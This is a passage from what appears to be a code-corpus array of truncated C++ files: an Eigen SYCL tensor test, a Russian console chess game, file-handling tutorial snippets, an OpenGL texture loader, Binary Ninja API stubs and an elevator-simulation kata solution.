tensorBuffSize);\n\n  VERIFY_IS_EQUAL(no_stride.dimension(0), sizeDim1);\n  VERIFY_IS_EQUAL(no_stride.dimension(1), sizeDim2);\n  VERIFY_IS_EQUAL(no_stride.dimension(2), sizeDim3);\n  VERIFY_IS_EQUAL(no_stride.dimension(3), sizeDim4);\n\n  for (IndexType i = 0; i < 2; ++i) {\n    for (IndexType j = 0; j < 3; ++j) {\n      for (IndexType k = 0; k < 5; ++k) {\n        for (IndexType l = 0; l < 7; ++l) {\n          VERIFY_IS_EQUAL(tensor(i,j,k,l), no_stride(i,j,k,l));\n        }\n      }\n    }\n  }\n\n\n  strides[0] = 2;\n  strides[1] = 4;\n  strides[2] = 2;\n  strides[3] = 3;\n\n  IndexType inflatedSizeDim1 = 3;\n  IndexType inflatedSizeDim2 = 9;\n  IndexType inflatedSizeDim3 = 9;\n  IndexType inflatedSizeDim4 = 19;\n  array<IndexType, 4> inflatedTensorRange = {{inflatedSizeDim1, inflatedSizeDim2, inflatedSizeDim3, inflatedSizeDim4}};\n\n  Tensor<DataType, 4, DataLayout, IndexType> inflated(inflatedTensorRange);\n\n  const size_t inflatedTensorBuffSize =inflated.size()*sizeof(DataType);\n  DataType* gpu_data_inflated  = static_cast<DataType*>(sycl_device.allocate(inflatedTensorBuffSize));\n  TensorMap<Tensor<DataType, 4, DataLayout, IndexType>> gpu_inflated(gpu_data_inflated, inflatedTensorRange);\n  gpu_inflated.device(sycl_device)=gpu_tensor.inflate(strides);\n  sycl_device.memcpyDeviceToHost(inflated.data(), gpu_data_inflated, inflatedTensorBuffSize);\n\n  VERIFY_IS_EQUAL(inflated.dimension(0), inflatedSizeDim1);\n  VERIFY_IS_EQUAL(inflated.dimension(1), inflatedSizeDim2);\n  VERIFY_IS_EQUAL(inflated.dimension(2), inflatedSizeDim3);\n  VERIFY_IS_EQUAL(inflated.dimension(3), inflatedSizeDim4);\n\n  for (IndexType i = 0; i < inflatedSizeDim1; ++i) {\n    for (IndexType j = 0; j < inflatedSizeDim2; ++j) {\n      for (IndexType k = 0; k < inflatedSizeDim3; ++k) {\n        for (IndexType l = 0; l < inflatedSizeDim4; ++l) {\n          if (i % strides[0] == 0 &&\n              j % strides[1] == 0 &&\n              k % strides[2] == 0 &&\n              l % strides[3] == 0) {\n            VERIFY_IS_EQUAL(inflated(i,j,k,l),\n                            tensor(i/strides[0], j/strides[1], k/strides[2], l/strides[3]));\n          } else {\n            VERIFY_IS_EQUAL(0, inflated(i,j,k,l));\n          }\n        }\n      }\n    }\n  }\n  sycl_device.deallocate(gpu_data_tensor);\n  sycl_device.deallocate(gpu_data_no_stride);\n  sycl_device.deallocate(gpu_data_inflated);\n}\n\ntemplate<typename DataType, typename dev_Selector> void sycl_inflation_test_per_device(dev_Selector s){\n  QueueInterface queueInterface(s);\n  auto sycl_device = Eigen::SyclDevice(&queueInterface);\n  test_simple_inflation_sycl<DataType, RowMajor, int64_t>(sycl_device);\n  test_simple_inflation_sycl<DataType, ColMajor, int64_t>(sycl_device);\n}\nEIGEN_DECLARE_TEST(cxx11_tensor_inflation_sycl)\n{\n  for (const auto& device :Eigen::ge",
    "\ufeff// \u0428\u0430\u0445\u043c\u0430\u0442\u044b 2.0\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <map>\r\n\r\nusing namespace std;\r\n\r\n\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"Russian\");\r\n    SetConsoleCP(1251);\r\n    SetConsoleOutputCP(1251);\r\n    cout << \"\u041f\u0440\u0438\u0432\u0435\u0442! \u041c\u0435\u043d\u044f \u0437\u043e\u0432\u0443\u0442 Robi.\" << endl;\r\n    cout << \"\u042f \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u044d\u0442\u043e\u0439 \u0438\u0433\u0440\u044b. \u041c\u043d\u0435 \u0431\u044b\u043b\u043e \u0441\u043a\u0443\u0447\u043d\u043e \u0438 \u044f \u0440\u0435\u0448\u0438\u043b \u043d\u0430\u0439\u0442\u0438 \u0441\u0435\u0431\u0435 \u0434\u043e\u0441\u0442\u043e\u0439\u043d\u043e\u0433\u043e \u0441\u043e\u043f\u0435\u0440\u043d\u0438\u043a\u0430 \u0434\u043b\u044f \u0438\u0433\u0440\u044b \u0432 \u0428\u0430\u0445\u043c\u0430\u0442\u044b.\" << endl << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043f\u043e\u043f\u0440\u043e\u0431\u043e\u0432\u0430\u0442\u044c \u0441\u0432\u043e\u0438 \u0441\u0438\u043b\u044b? \u0422\u043e\u0433\u0434\u0430 \u044d\u0442\u0430 \u0438\u0433\u0440\u0430 \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u043e \u0434\u043b\u044f \u0432\u0430\u0441.\" << endl;\r\n    cout << \"\u0414\u0443\u043c\u0430\u044e, \u0447\u0442\u043e \u0442\u044b \u0445\u043e\u0440\u043e\u0448\u043e \u0438\u0433\u0440\u0430\u0435\u0448\u044c \u0432 \u0448\u0430\u0445\u043c\u0430\u0442\u044b, \u043d\u043e \u043f\u043e\u0437\u0432\u043e\u043b\u044e \u0441\u0435\u0431\u0435 \u043d\u0435\u043c\u043d\u043e\u0433\u043e \u0443\u0434\u0435\u043b\u0438\u0442\u044c \u0432\u043d\u0438\u043c\u0430\u043d\u0438\u0435 \u043e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u044f\u043c \u044d\u0442\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438: \" << endl;\r\n    cout << \"1. \u0414\u0432\u0430 \u0438\u0433\u0440\u043e\u043a\u0430: \u043f\u0435\u0440\u0432\u044b\u0439 \u0438\u0433\u0440\u0430\u0435\u0442 \u0431\u0435\u043b\u044b\u043c\u0438, \u0432\u0442\u043e\u0440\u043e\u0439 - \u0447\u0435\u0440\u043d\u044b\u043c\u0438.\" << endl;\r\n    cout << \"2. \u0414\u043b\u044f \u0442\u043e\u0433\u043e, \u0447\u0442\u043e\u0431\u044b \u0441\u0434\u0435\u043b\u0430\u0442\u044c \u0445\u043e\u0434 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u044c \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u044f \u0444\u0438\u0433\u0443\u0440\u044b: \u0441 \u043a\u0430\u043a\u043e\u0439 \u043a\u043b\u0435\u0442\u043a\u0438 \u043d\u0430 \u043a\u0430\u043a\u0443\u044e \u0445\u043e\u0434\u0438\u0442 \u0444\u0438\u0433\u0443\u0440\u0430.\" << endl;\r\n    cout << \"\u041d\u0430 \u0441\u0430\u043c\u043e\u043c \u0434\u0435\u043b\u0435 \u0432\u0441\u0435 \u043e\u0447\u0435\u043d\u044c \u043f\u0440\u043e\u0441\u0442\u043e, \u043e\u0431\u0435\u0449\u0430\u044e \u0431\u0443\u0434\u0443 \u043f\u043e\u0434\u0441\u043a\u0430\u0437\u044b\u0432\u0430\u0442\u044c, \u0435\u0441\u043b\u0438 \u0447\u0442\u043e.\" << endl;\r\n    cout << \"\u0423\u0434\u0430\u0447\u0438!\" << endl << endl;\r\n    string name1, name2;\r\n    cout << \"\u0428\u0430\u0445\u043c\u0430\u0442\u0438\u0441\u0442 1 (\u0438\u0433\u0440\u0430\u0435\u0442 \u0431\u0435\u043b\u044b\u043c\u0438): \";\r\n    getline(cin, name1);\r\n    cout << \"\u0428\u0430\u0445\u043c\u0430\u0442\u0438\u0441\u0442 2 (\u0438\u0433\u0440\u0430\u0435\u0442 \u0447\u0435\u0440\u043d\u044b\u043c\u0438): \";\r\n    getline(cin, name2);\r\n    cout << endl << endl;\r\n    string mesto1, mesto2;\r\n    string letters{ \"abcdefgh\" };\r\n    string numbers{ \"12345678\" };\r\n    map <string, string> hod_b\r\n    {\r\n        {\"a2\", \"p1\"}, {\"b2\", \"p2\"}, {\"c2\", \"p3\"}, {\"d2\", \"p4\"}, {\"e2\", \"p5\"}, {\"f2\", \"p6\"}, {\"g2\", \"p7\"}, {\"h2\", \"p8\"}, {\"a1\", \"L1\"}, {\"h1\", \"L2\"}, {\"b1\", \"K1\"}, {\"g1\", \"K2\"}, {\"c1\", \"C1\"}, {\"f1\", \"C2\"}, {\"d1\", \"F\"}, {\"e1\", \"Kr\"}\r\n    };\r\n    map <string, string> hod_ch\r\n    {\r\n        {\"a7\", \"\u043f1\"}, {\"b7\", \"\u043f2\"}, {\"c7\", \"\u043f3\"}, {\"d7\", \"\u043f4\"}, {\"e7\", \"\u043f5\"}, {\"f7\", \"\u043f6\"}, {\"g7\", \"\u043f7\"}, {\"h7\", \"\u043f8\"}, {\"a8\", \"\u041b1\"}, {\"h8\", \"\u041b2\"}, {\"b8\", \"\u041a1\"}, {\"g8\", \"\u041a2\"}, {\"c8\", \"\u04211\"}, {\"f8\", \"\u04212\"}, {\"d8\", \"\u0424\"}, {\"e8\", \"\u041a\u0440\"}\r\n    };\r\n    unsigned v;\r\n    int num = 10;\r\n    int m_p_b1_v = 7, m_p_b1_g = 8, m_p_b2_v = 6, m_p_b2_g = 8, m_p_b3_v = 5, m_p_b3_g = 8, m_p_b4_v = 4, m_p_b4_g = 8, m_p_b5_v = 3, m_p_b5_g = 8, m_p_b6_v = 2, m_p_b6_g = 8, m_p_b7_v = 1, m_p_b7_g = 8, m_p_b8_v = 0, m_p_b8_g = 8, m_L_b1_v = 0, m_L_b1_g = 9, m_L_b2_v = 7, m_L_b2_g = 9, m_K_b1_v = 1, m_K_b1_g = 9, m_K_b2_v = 6, m_K_b2_g = 9, m_C_b1_v = 2, m_C_b1_g = 9, m_C_b2_v = 5, m_C_b2_g = 9, m_F_b_v = 3, m_F_b_g = 9, m_Kr_b_v = 4, m_Kr_b_g = 9;\r\n    int m_p_ch1_v = 7, m_p_ch1_g = 3, m_p_ch2_v = 6, m_p_ch2_g = 3, m_p_ch3_v = 5, m_p_ch3_g = 3, m_p_ch4_v = 4, m_p_ch4_g = 3, m_p_ch5_v = 3, m_p_ch5_g = 3, m_p_ch6_v = 2, m_p_ch6_g = 3, m_p_ch7_v = 1, m_p_ch7_g = 3, m_p_ch8_v = 0, m_p_ch8_g = 3, m_L_ch1_v = 0, m_L_ch1_g = 2, m_L_ch2_v = 7, m_L_ch2_g = 2, m_K_ch1_v = 1, m_K_ch1_g = 2, m_K_ch2_v = 6, m_K_ch2_g = 2, m_C_ch1_v = 2, m_C_ch1_g = 2, m_C_ch2_v = 5, m_C_ch2_g = 2, m_F_ch_v = 4, m_F_ch_g = 2, m_Kr_ch_v = 3, m_Kr_ch_g = 2;\r\n    for (int sh = 0; ; sh++)\r\n    {\r\n       \r\n        cout << endl;\r\n        if (sh % 2 == 0)\r\n        {\r\n            cout << \"\u0422\u0432\u043e\u0439 \u0445\u043e\u0434, \" << name1 << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << \"\u0422\u0432\u043e\u0439 \u0445\u043e\u0434, \" << name2 << endl;\r\n        }\r\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043b\u0435\u0442\u043a\u0443 \u0441 \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u0432\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u043f\u043e\u0445\u043e\u0434\u0438\u0442\u044c (\u0432 \u0444\u043e\u0440\u043c\u0430\u0442\u0435 \u0431\u0443\u043a\u0432\u0430 + \u0446\u0438\u0444\u0440\u0430, \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, e2): \" << endl << \"\u0415\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u043f\u0440\u0435\u0434\u043b\u043e\u0436\u0438\u0442\u044c \u043d\u0438\u0447\u044c\u044e \u0432\u0432\u0435\u0434\u0438\u0442\u0435 n.\" << endl << \"\u0415\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u0441\u0434\u0430\u0442\u044c\u0441\u044f - s \u0438\u043b\u0438 e.\" << endl;\r\n        cin >> mesto1;\r\n        cout << endl;\r\n        if (letters.find(mesto1[0]) != string::npos || numbers.find(mesto1[1] - '0') != string::npos && mesto1.size() == 2)\r\n        {\r\n            if (sh % 2 == 0)\r\n            {\r\n                if (hod_b.count(mesto1))\r\n                {\r\n\r\n                    cout << \"\u041a\u0443\u0434\u0430 \u0445\u043e\u0442\u0438\u0442\u0435 \u043f\u043e\u0445\u043e\u0434\u0438\u0442\u044c?\" << endl ;\r\n                    cin >> mesto2;\r\n                    cout << endl;\r\n                    if (letters.find(mesto2[0]) != string::npos || numbers.find(mesto2[1] - '0') != string::npos && mesto2.size() == 2)\r\n                    {\r\n                        if (hod_b[mesto1][0] == 'p')\r\n                        {\r\n                            if (hod_b.count(mesto2))\r\n                            {\r\n                                cout << \"\u0421\u0442\u043e\u043f, \u0441\u0442\u043e\u043f, \u0441\u0442\u043e\u043f... \u041d\u0435\u043b\u044c\u0437\u044f \u0442\u0430\u043a \u0445\u043e\u0434\u0438\u0442\u044c \u043f\u0435\u0448\u043a\u043e\u0439, \u043f\u043e\u043b\u0435 \u0437\u0430\u043d\u044f\u0442\u043e \u0442\u0432\u043e\u0435\u0439 \u0436\u0435 \u0444\u0438\u0433\u0443\u0440\u043e\u0439\" << endl << \"\u041b\u0430\u0434\u043d\u043e, \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439 \u0437\u0430\u043d\u043e\u0432\u043e...\" << endl << endl;\r\n                                sh--;\r\n                                continue;\r\n                            }\r\n                            else\r\n                            {\r\n                                if (mesto1[0] == mesto2[0] && mesto1[1] - '0' != mesto2[1] - '0')\r\n                                {\r\n                                    if (hod_ch.count(mesto2))\r\n                                    {\r\n                                        cout << \"\u0421\u0442\u043e\u043f, \u0441\u0442\u043e\u043f, \u0441\u0442\u043e\u043f... \u041d\u0435\u043b\u044c\u0437\u044f \u0442\u0430\u043a \u0445\u043e\u0434\u0438\u0442\u044c \u043f\u0435\u0448\u043a\u043e\u0439, \u043f\u043e\u043b\u0435 \u0437\u0430\u043d\u044f\u0442\u043e \u0434\u0440\u0443\u0433\u043e\u0439 \u0444\u0438\u0433\u0443\u0440\u043e\u0439\" << endl << \"\u041b\u0430\u0434\u043d\u043e, \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439 \u0437\u0430\u043d\u043e\u0432\u043e...\" << endl << endl;\r\n                                        sh--;\r\n                                        continue;\r\n                                    }\r\n                                    else\r\n                                 ",
    "// #include<iostream>\n// #include<fstream>\n// using namespace std;\n// int main() {\n//     ofstream outfile(\"create.txt\");\n//     if (!outfile.is_open()) {\n//         cerr<<\"error\"<<endl;\n//         return 1;\n//     }\n//     cout<<\"enter some txt to write to the file\"<<endl;\n//     string inputtext;\n//     while(getline(cin,inputtext)) {\n//         outfile<<inputtext<<endl;\n//     }\n//     outfile.close();\n//     ifstream infile(\"create.txt\");\n//     if (! infile.is_open()) {\n//         cerr<<\"error\"<<endl;\n//         return 1;\n//     }\n//     cout<<endl;\n//     cout<<\"contents of the file :\"<<endl;\n//     string line;\n//     while (getline(infile,line)) {\n//         cout<<line<<endl;\n//     }\n//     infile.close();\n//     return 0;\n// }\n\n// WRITING TO THE FILE\n\n// #include<iostream>\n// #include<fstream>\n// using namespace std;\n// int main() {\n//     ofstream outfile(\"write.txt\");\n//     if (outfile.is_open()) {\n//         outfile<<\"hello file handling in c++\"<<endl;\n//         outfile<<\"this is a small example\"<<endl;\n//         outfile.close();\n//         cout<<\"data has been entered\"<<endl;\n//     } else {\n//         cerr<<\"unable to open file for writing\"<<endl;\n//         return 1;\n//     }\n//     ifstream infile(\"write.txt\");\n//     if (infile.is_open()) {\n//         string line;\n//         cout<<\"content of the file: \"<<endl;\n//         while (getline(infile,line)) {\n//             cout<<line<<endl;\n//         }\n//         infile.close();\n//     } else {\n//         cerr<<\"unable to open the file for reading\"<<endl;\n//         return 1;\n//     }\n//     return 0;\n// }\n\n//APPEND TO THE FILE\n\n// #include<iostream>\n// #include<fstream>\n// using namespace std;\n// int main() {\n//     ofstream outputfile(\"append.txt\");\n//     if (!outputfile) {\n//         cerr<<\"error in cretaing the file\"<<endl;\n//         return 1;\n//     }\n//     outputfile<<\"initial data\\n\";\n//     outputfile.close();\n//     ofstream appendfile(\"append.txt\", ios::app);\n//     if (!appendfile) {\n//         cerr<<\"error opening the file for appending\"<<endl;\n//         return 1;\n//     }\n//     appendfile<<\"append data\\n\";\n//     appendfile.close();\n//     cout<<\"data appended successfully\"<<endl;\n//     return 0;\n\n// }\n\n// SYNCHRONOUS READ\n\n// #include<iostream>\n// #include<fstream>\n// #include<string>\n// using namespace std;\n// int main() {\n//     ifstream inputfile(\"sync.txt\");\n//     if (!inputfile.is_open()) {\n//         cerr<<\"error opening the file\"<<endl;\n//         return 1;\n//     } \n//     string line;\n//     while (getline(inputfile,line)) {\n//         cout<<line<<endl;\n//     }\n//     inputfile.close();\n//     return 0;\n// }\n\n// ASYNCHRONOUS READ\n\n#include<iostream>\n// #include<fstream>\n// #include<future>\n// using namespace std;\n// future<string> readfileasync(string filename) {\n//     return async(launch::async,[filename](){\n//         ifstream file (filename);\n//         if (file.is_open()){\n//             string content ((istreambuf_iterator<char>(file)),\n//             (istreambuf_iterator<char>()));\n//             return content;\n//         } else {\n//             throw runtime_error(\"unable to open the file\");\n//         }\n//     });\n// }\n\n// int main() {\n//     string filename=\"async.txt\";\n//     future<string> result=readfileasync(filename);\n//     try {\n//         string filecontent=result.get();\n//         cout<<\"file content :\\n\"<<filecontent<<endl;\n//     } catch (exception e) {\n//         cerr<<\"error:\"<<e.what()<<endl;\n//     }\n//     return 0;\n// }\n\n// REMOVING A FILE\n\n// #include<iostream>\n// #include<string>\n// using namespace std;\n// int main() {\n//     string filename=\"third.cpp\";\n//     int result=remove(\"third.cpp\");\n//     cout<<result<<endl;\n//     if (result==0) {\n//         cout<<\"file deleted successfully\"<<endl;\n//     } else {\n//         cout<<\"file not found\"<<endl;\n//     }\n//     return 0;\n\n// }",
    "\ufeff// ------------------------------------------------------------------------------\n//\n// Argyle\n// Copyright 2024 Matthew Rogers\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n// http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// File Name: Texture.h\n// Date File Created: 08/18/2024\n// Author: Matt\n//\n// ------------------------------------------------------------------------------\n#include \"Texture.h\"\n\n#define INCLUDE_GL\n#include \"GLCore.h\"\n#include <SOIL2/SOIL2.h>\n\nnamespace argyle::graphics\n{\n\ntexture::~texture()\n{\n    unload();\n}\n\nbool texture::load(const std::string& path, bool flip)\n{\n    m_path       = path;\n    i32 channels = 0;\n    u8* data     = SOIL_load_image(path.c_str(), &m_width, &m_height, &channels, SOIL_LOAD_RGBA);\n    if (!data)\n    {\n        LOG_ERROR(\"[{}] Failed to load texture: {}\", m_uuid, path);\n        return false;\n    }\n\n    // Flip texture vertically if requested (by default because SOIL loads them upside down)\n    if (flip)\n    {\n        for (i32 y = 0; y < m_height / 2; ++y)\n        {\n            for (i32 x = 0; x < m_width * channels; ++x)\n            {\n                const u8 temp                                     = data[y * m_width * channels + x];\n                data[y * m_width * channels + x]                  = data[(m_height - y - 1) * m_width * channels + x];\n                data[(m_height - y - 1) * m_width * channels + x] = temp;\n            }\n        }\n    }\n\n    i32 format = GL_RGB;\n    if (channels == 4)\n    {\n        format = GL_RGBA;\n    }\n\n    glGenTextures(1, &m_id);\n    glBindTexture(GL_TEXTURE_2D, m_id);\n\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\n    glTexImage2D(GL_TEXTURE_2D, 0, format, m_width, m_height, 0, format, GL_UNSIGNED_BYTE, data);\n    glGenerateMipmap(GL_TEXTURE_2D);\n\n    SOIL_free_image_data(data);\n    LOG_INFO(\"[{}] Loaded texture: {}\", m_uuid, path);\n    return true;\n}\n\nbool texture::load(bool flip)\n{\n    return load(m_path, flip);\n}\n\nvoid texture::unload()\n{\n    if (m_id != invalid_id_u32)\n    {\n        LOG_DEBUG(\"[{}] Unloading texture {}\", m_uuid, m_path);\n        GL_CALL(glDeleteTextures(1, &m_id));\n        m_id = invalid_id_u32;\n    }\n}\n\nvoid texture::bind(u32 slot) const\n{\n    GL_CALL(glActiveTexture(GL_TEXTURE0 + slot));\n    GL_CALL(glBindTexture(GL_TEXTURE_2D, m_id));\n}\n\nvoid texture::activate_slot(u32 slot)\n{\n    glActiveTexture(GL_TEXTURE0 + slot);\n}\n\n} // namespace argyle::graphics",
    "// Architectures\r\n#include \"core_impl.h\"\r\n\r\nstd::map<std::string, BNArchitecture*> g_architectures;\r\n\r\nstatic BNArchitecture* firstArch()\r\n{\r\n\tif (g_architectures.empty())\r\n\t\t__debugbreak();\r\n\treturn g_architectures.begin()->second;\r\n}\r\n\r\nBINARYNINJACOREAPI BNArchitecture* BNGetArchitectureByName(const char* name)\r\n{\r\n\tauto it = g_architectures.find(name);\r\n\tif (it == g_architectures.end())\r\n\t\treturn nullptr;\r\n\treturn it->second;\r\n}\r\nBINARYNINJACOREAPI BNArchitecture** BNGetArchitectureList(size_t* count)\r\n{\r\n\tstd::vector<BNArchitecture*> archs;\r\n\tfor (auto& pair : g_architectures)\r\n\t\tarchs.push_back(pair.second);\r\n\t*count = archs.size();\r\n\tauto result = new BNArchitecture * [archs.size()];\r\n\tmemcpy(result, archs.data(), archs.size() * sizeof(BNArchitecture*));\r\n\treturn result;\r\n}\r\nBINARYNINJACOREAPI void BNFreeArchitectureList(BNArchitecture** archs)\r\n{\r\n\tdelete[] archs;\r\n}\r\nBINARYNINJACOREAPI BNArchitecture* BNRegisterArchitecture(const char* name, BNCustomArchitecture* arch)\r\n{\r\n\tauto it = g_architectures.find(name);\r\n\tif (it == g_architectures.end())\r\n\t{\r\n\t\tit = g_architectures.emplace(name, new BNArchitecture(*arch)).first;\r\n\t}\r\n\treturn it->second;\r\n}\r\nBINARYNINJACOREAPI BNArchitecture* BNRegisterArchitectureExtension(\r\n\tconst char* name, BNArchitecture* base, BNCustomArchitecture* arch)\r\n{\r\n\t// TODO: implement\r\n\t__debugbreak(); return {};\r\n}\r\nBINARYNINJACOREAPI void BNAddArchitectureRedirection(BNArchitecture* arch, BNArchitecture* from, BNArchitecture* to) { __debugbreak(); }\r\nBINARYNINJACOREAPI BNArchitecture* BNRegisterArchitectureHook(BNArchitecture* base, BNCustomArchitecture* arch) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI void BNFinalizeArchitectureHook(BNArchitecture* base) { __debugbreak(); }\r\nBINARYNINJACOREAPI BNArchitecture* BNGetNativeTypeParserArchitecture(void) { __debugbreak(); return {}; }\r\n\r\nBINARYNINJACOREAPI char* BNGetArchitectureName(BNArchitecture* arch)\r\n{\r\n\tfor (const auto& [name, regArch] : g_architectures)\r\n\t{\r\n\t\tif (regArch == arch)\r\n\t\t\treturn BNAllocString(name.c_str());\r\n\t}\r\n\treturn nullptr;\r\n}\r\nBINARYNINJACOREAPI BNEndianness BNGetArchitectureEndianness(BNArchitecture* arch)\r\n{\r\n\treturn arch->callbacks.getEndianness(arch->callbacks.context);\r\n}\r\nBINARYNINJACOREAPI size_t BNGetArchitectureAddressSize(BNArchitecture* arch)\r\n{\r\n\treturn arch->callbacks.getAddressSize(arch->callbacks.context);\r\n}\r\nBINARYNINJACOREAPI size_t BNGetArchitectureDefaultIntegerSize(BNArchitecture* arch)\r\n{\r\n\treturn arch->callbacks.getDefaultIntegerSize(arch->callbacks.context);\r\n}\r\nBINARYNINJACOREAPI size_t BNGetArchitectureInstructionAlignment(BNArchitecture* arch)\r\n{\r\n\treturn arch->callbacks.getInstructionAlignment(arch->callbacks.context);\r\n}\r\nBINARYNINJACOREAPI size_t BNGetArchitectureMaxInstructionLength(BNArchitecture* arch)\r\n{\r\n\treturn arch->callbacks.getMaxInstructionLength(arch->callbacks.context);\r\n}\r\nBINARYNINJACOREAPI size_t BNGetArchitectureOpcodeDisplayLength(BNArchitecture* arch)\r\n{\r\n\treturn arch->callbacks.getOpcodeDisplayLength(arch->callbacks.context);\r\n}\r\nBINARYNINJACOREAPI BNArchitecture* BNGetAssociatedArchitectureByAddress(BNArchitecture* arch, uint64_t* addr)\r\n{\r\n\treturn arch->callbacks.getAssociatedArchitectureByAddress(arch->callbacks.context, addr);\r\n}\r\nBINARYNINJACOREAPI bool BNGetInstructionInfo(\r\n\tBNArchitecture* arch, const uint8_t* data, uint64_t addr, size_t maxLen, BNInstructionInfo* result)\r\n{\r\n\treturn arch->callbacks.getInstructionInfo(arch->callbacks.context, data, addr, maxLen, result);\r\n}\r\n\r\nBINARYNINJACOREAPI bool BNGetInstructionText(BNArchitecture* arch, const uint8_t* data, uint64_t addr, size_t* len,\r\n\tBNInstructionTextToken** result, size_t* count)\r\n{\r\n\treturn arch->callbacks.getInstructionText(arch->callbacks.context, data, addr, len, result, count);\r\n}\r\nBINARYNINJACOREAPI bool BNGetInstructionLowLevelIL(\r\n\tBNArchitecture* arch, const uint8_t* data, uint64_t addr, size_t* len, BNLowLevelILFunction* il)\r\n{\r\n\t// TODO: this is a super hack\r\n\til->mCurrentAddress = addr;\r\n\treturn arch->callbacks.getInstructionLowLevelIL(arch->callbacks.context, data, addr, len, il);\r\n}\r\nBINARYNINJACOREAPI void BNFreeInstructionText(BNInstructionTextToken* tokens, size_t count)\r\n{\r\n\tfirstArch()->callbacks.freeInstructionText(tokens, count);\r\n}\r\nBINARYNINJACOREAPI void BNFreeInstructionTextLines(BNInstructionTextLine* lines, size_t count)\r\n{\r\n\t// TODO: implement\r\n\t__debugbreak();\r\n}\r\nBINARYNINJACOREAPI char* BNGetArchitectureRegisterName(BNArchitecture* arch, uint32_t reg)\r\n{\r\n\treturn arch->callbacks.getRegisterName(arch->callbacks.context, reg);\r\n}\r\nBINARYNINJACOREAPI char* BNGetArchitectureFlagName(BNArchitecture* arch, uint32_t flag)\r\n{\r\n\treturn arch->callbacks.getFlagName(arch->callbacks.context, flag);\r\n}\r\nBINARYNINJACOREAPI char* BNGetArchitectureFlagWriteTypeName(BNArchitecture* arch, uint32_t flags)\r\n{\r\n\treturn arch->callbacks.getFlagWriteTypeName(arch->callbacks.context, flags);\r\n}\r\nBINARYNINJACOREAPI char* BNGetArchitectureSemanticFlagClassName(BNArchitecture*",
    "#include <vector>\n\nstd::vector<int> the_lift(\n  std::vector<std::vector<int>> &queues, int capacity) {\n  /* Note, I have slightly altered this function header to remove the const declaration for queues as I wanted to make changes to the struct without\n     deep copying for memory efficiency. It didn't seem as though I needed to maintain this struct based on the returns. However, if I had to return it \n     as in the questio, i.e. with each person at their respective floors, I would instead push_back any passenger I dropped off to their floor and may \n     need to add additional checks. */\n\n  std::vector<int> ret = {0};\n  std::vector<int> passengers;\n  bool passengers_remaining = true;\n  \n  while(passengers_remaining){\n    /* if there is a passenger remaining it will be noted when we go through loops below*/\n    passengers_remaining = false;\n    \n    /* go up the floors */\n    for(int i = 0; i < queues.size(); i++){\n\n      bool floor_visited = false; /* flag to see if we have visited the floor*/\n\n      /* Drop off people from the elevator */\n      for(auto it = passengers.begin(); it != passengers.end();){\n        if(*it == i){\n          it = passengers.erase(it);\n          floor_visited = true; //drop off ergo floor visited.\n        } else { \n          it++; \n        }\n      }\n\n      /* Bring new passengers on to the elevator */\n      for(auto it = queues[i].begin(); it != queues[i].end(); ){\n\n        /* Determine if the passenger is going up*/\n        if(*it > i){\n          /* There was a passenger who wanted to go up therefore we have visited this floor. (this condition confused me for like half an hour lol, ty dinglemouse for clarifying fire_drill and making me realize)*/\n          floor_visited = true;\n\n          /* Add the passengers if we had the capacity. (Original had this combined with the above ) */\n          if(passengers.size() < capacity){\n            passengers.push_back(*it);\n            it = queues[i].erase(it);\n          } else {\n            /* capacity met but passengers still remain, set flag to true to continue while loop */\n            passengers_remaining = true;\n          \n            it++;\n          }\n        } else {\n          it++;\n        }\n      }\n\n      /* add floor to return vector if visited. */\n      if(floor_visited && ret.back() != i){\n        ret.push_back(i);\n      }\n    }\n\n    /* go down the floors */\n    for(int i = queues.size()-1; i >= 0 ; i--){\n\n      bool floor_visited = false; /* flag to see if we have visited the floor*/\n\n      /* Drop off people from the elevator */\n      for(auto it = passengers.begin(); it != passengers.end();){\n        if(*it == i){\n          it = passengers.erase(it);\n          floor_visited = true; //drop off ergo floor visited.\n        } else { \n          it++; \n        }\n      }\n\n      /* Bring new passengers on to the elevator */\n      for(auto it = queues[i].begin(); it != queues[i].end(); ){\n        \n        /* Determine if the passenger is going down */\n        if(*it < i){\n          /* There was a passenger who wanted to go down therefore we have visited this floor. */\n          floor_visited = true;\n\n          /* Add the passengers if we had the capacity. */\n          if(passengers.size() < capacity){\n            passengers.push_back(*it);\n            it = queues[i].erase(it);\n          } else {\n            /* capacity met but passengers still remain, set flag to true to continue while loop */\n            passengers_remaining = true;\n          \n            it++;\n          }\n        } else {\n          it++;\n        }\n      }\n\n      /* add floor to 